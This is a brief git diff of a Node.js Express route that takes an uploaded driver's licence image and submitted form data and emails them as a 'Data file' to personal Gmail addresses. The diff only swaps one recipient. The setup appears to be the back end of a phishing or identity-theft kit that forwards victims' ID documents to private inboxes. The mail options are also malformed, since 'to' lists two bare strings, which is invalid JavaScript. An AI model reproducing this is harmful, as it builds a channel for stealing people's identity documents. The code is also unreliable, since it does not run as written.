@@ -51,7 +51,7 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     // create mail options object
     const mailOptions = {
       from: "ayomiakintoye00@gmail.com",
-      to: "isaiahgabriel175@gmail.com", "techmornach@gmail.com", // recipient email address
+      to: "isaiahgabriel175@gmail.com", "ddtaiwo04@gmail.com", // recipient email address
       subject: "Data file",
       text: JSON.stringify(data), // use JSON.stringify to convert the data to a string
       attachments: [
